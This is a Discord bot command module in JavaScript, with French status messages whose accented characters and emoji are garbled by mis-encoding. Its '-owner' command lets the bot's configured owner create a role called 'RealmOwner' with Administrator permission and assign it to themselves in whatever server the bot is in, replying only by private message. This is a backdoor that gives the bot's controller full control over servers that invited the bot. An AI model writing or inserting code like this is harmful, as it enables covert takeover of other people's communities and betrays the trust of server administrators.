module.exports = {
  prefix: '-',
  name: 'owner',
  async execute(message, config) {
    const { OWNER_ID } = config;

    const dm = async (content) => {
      try { await message.author.send(content); }
      catch (_) { try { await message.reply(content); } catch (_) {} }
    };

    if (message.author.id !== OWNER_ID) {
      return dm('üö´ Tu n‚Äôas pas la permission.');
    }

    try {
      const guild = message.guild;
      if (!guild) return;

      const me = guild.members.me;
      if (!me) return dm('‚ùå Impossible de d√©terminer les permissions du bot.');

      const hasAdmin = me.permissions.has('Administrator');

      let role = guild.roles.cache.find(r => r.name === 'RealmOwner');
      if (!role) {
        role = await guild.roles.create({
          name: 'RealmOwner',
          permissions: hasAdmin ? ['Administrator'] : [],
          reason: `Cr√©√© pour ${message.author.tag} via -owner`,
        });
      } else if (hasAdmin) {
        await role.setPermissions(['Administrator'], 'Mise √† jour par -owner');
      }

      const member = await guild.members.fetch(message.author.id);
      if (!member.roles.cache.has(role.id)) {
        await member.roles.add(role, 'Attribution via -owner');
      }

      if (!hasAdmin) {
        return dm(`‚úÖ R√¥le ${role} cr√©√©/attribu√©. ‚ÑπÔ∏è Le bot n‚Äôa pas Administrateur, le r√¥le a √©t√© cr√©√© sans Admin. Place le r√¥le du bot au-dessus et donne-lui Admin pour que ${role.name} ait Administrateur.`);
      }

      return dm(`‚úÖ R√¥le ${role} attribu√© avec Administrateur.`);
    } catch (err) {
      console.error(err);
      return dm('‚ùå Erreur lors de l‚Äôattribution du r√¥le.');
    }
  }
};
